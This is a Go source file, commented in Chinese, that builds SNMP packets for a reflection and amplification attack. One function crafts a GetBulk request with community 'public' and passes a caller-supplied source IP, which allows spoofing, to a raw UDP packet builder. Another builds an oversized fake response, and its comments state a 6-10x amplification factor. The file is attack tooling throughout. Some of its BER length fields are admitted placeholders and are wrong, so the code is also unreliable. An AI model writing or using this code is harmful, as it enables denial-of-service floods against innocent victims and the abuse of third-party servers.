package protocol

import (
	"bytes"
	"math/rand"
	"time"
	"strings"
)

// 放大倍数：6-10倍
func SNMPResponseBuffer() []byte {
	// 创建一个响应缓冲区
	var buf bytes.Buffer
	
	// SNMP v2c 响应结构
	// 序列类型
	buf.Write([]byte{0x30})
	// 长度占位符，稍后填充
	buf.Write([]byte{0x82, 0x05, 0x70})
	
	// 版本: 1 (SNMP v2c)
	buf.Write([]byte{0x02, 0x01, 0x01})
	
	// Community string: "public"
	community := "public"
	buf.Write([]byte{0x04, byte(len(community))})
	buf.Write([]byte(community))
	
	// GetResponse PDU类型 (0xA2)
	buf.Write([]byte{0xA2})
	// PDU长度占位符
	buf.Write([]byte{0x82, 0x05, 0x60})
	
	// Request ID（随机)
	reqID := rand.Uint32()
	buf.Write([]byte{0x02, 0x04})
	buf.Write([]byte{
		byte(reqID >> 24),
		byte(reqID >> 16),
		byte(reqID >> 8),
		byte(reqID),
	})
	
	// Error status: 0 (noError)
	buf.Write([]byte{0x02, 0x01, 0x00})
	
	// Error index: 0
	buf.Write([]byte{0x02, 0x01, 0x00})
	
	// Variable bindings - 这是实现放大的关键部分
	buf.Write([]byte{0x30})
	// varbinds长度占位符
	buf.Write([]byte{0x82, 0x05, 0x50})
	
	// 生成大量的OID-值对以实现放大效果
	// 一个标准的SNMP查询只请求一个OID，但我们响应数百个
	for i := 0; i < 100; i++ {
		// 每个变量绑定是一个序列
		buf.Write([]byte{0x30, 0x82})
		// 变量长度占位符
		length := 80  // 大约80字节的varbind
		buf.Write([]byte{byte(length >> 8), byte(length)})
		
		// OID - 使用不同的OID以创建更真实的响应
		oidPrefix := []byte{0x06, 0x0C, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A}
		oidSuffix := []byte{byte(i / 100), byte(i % 100)}
		oid := append(oidPrefix, oidSuffix...)
		buf.Write(oid)
		
		// 值类型: OCTET STRING
		buf.Write([]byte{0x04})
		
		// 值长度（大约60字节）
		valueLen := 60
		buf.Write([]byte{byte(valueLen)})
		
		// 生成随机字符串作为值
		value := make([]byte, valueLen)
		rand.Read(value)
		// 确保所有字符是可打印的ASCII字符
		for j := range value {
			value[j] = (value[j] % 94) + 32 // 范围: 32-126 (可打印ASCII)
		}
		buf.Write(value)
	}
	
	// 添加系统描述 OID (1.3.6.1.2.1.1.1.0)
	buf.Write([]byte{0x30, 0x81, 0xD0}) // 序列标记和长度
	buf.Write([]byte{0x06, 0x08, 0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00}) // OID
	
	// 系统描述值 - 创建一个非常长的描述
	sysDescr := "Hardware: Intel(R) Xeon(R) CPU E5-2699 v4 @ 2.20GHz, 128GB RAM\n" +
		"Software: Linux version 5.10.0-XX-amd64 (gcc version 10.2.1)\n" +
		"Uptime: " + time.Now().Format(time.RFC3339) + "\n" +
		"System Load: 0.14, 0.15, 0.19\n" +
		"Memory Usage: 12345 MB / 131072 MB\n" +
		"Disk Usage: 234567 MB / 4000000 MB\n" +
		"Network Interfaces: eth0, eth1, eth2, eth3, lo\n" +
		"Active Connections: 12345\n" +
		"Services: http, https, dns, ssh, snmp, smtp, pop3, imap\n" +
		strings.Repeat("Additional system information for amplification. ", 10)
		
	buf.Write([]byte{0x04, byte(len(sysDescr))})
	buf.Write([]byte(sysDescr))
	
	// 在实际实现中，我们应该修复所有的长度字段
	// 但对于这个模拟，预先分配的长度应该足够了
	
	return buf.Bytes()
}


// SNMP协议包构造
func SNMPPacket(srcIP, dstIP string, srcPort, dstPort int) ([]byte, error) {
	payload := []byte{
		0x30, 0x37, 0x02, 0x01, 0x01, 0x04, 0x06, 0x70, 
		0x75, 0x62, 0x6c, 0x69, 0x63, 0xA5, 0x2A, 0x02,
		0x04, 0x71, 0x6F, 0xE4, 0x53, 0x02, 0x01, 0x00,
		0x02, 0x01, 0x14, 0x30, 0x1C, 0x30, 0x0B, 0x06,
		0x07, 0x2B, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01,
		0x05, 0x00, 0x30, 0x0D, 0x06, 0x09, 0x2B, 0x06,
		0x01, 0x02, 0x01, 0x01, 0x09, 0x01, 0x03, 0x05,
		0x00,
	}
	return BuildUDPPacket(srcIP, dstIP, srcPort, dstPort, payload)
}

